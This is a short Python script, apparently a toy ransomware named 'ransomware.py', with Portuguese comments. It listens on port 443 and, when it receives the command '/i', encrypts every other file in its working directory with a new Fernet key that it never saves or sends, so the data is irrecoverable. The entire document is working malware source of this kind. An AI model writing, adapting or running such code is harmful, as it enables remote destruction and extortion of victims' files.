import os
import socket
from cryptography.fernet import Fernet

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

arquivos = []

HOST = ""
PORT = 443

server.bind((HOST, PORT))
server.listen(1)

while True:
    conexao, addr = server.accept()
    dados = conexao.recv(2028)
    mensagem = dados.decode()
    arquivos = [] # Reinicia os arquivos
    key = Fernet.generate_key()

    if mensagem == "/i":
        for arquivo in os.listdir():
            if arquivo == "ransomware.py":
                continue
            if os.path.isfile(arquivo):
                arquivos.append(arquivo)

        for arquivo in arquivos:
            with open(arquivo, "rb") as file:
                content = file.read()
            encrypt_file = Fernet(key).encrypt(content)
            with open(arquivo, "wb") as content_encrypt:
                content_encrypt.write(encrypt_file)

    conexao.close()
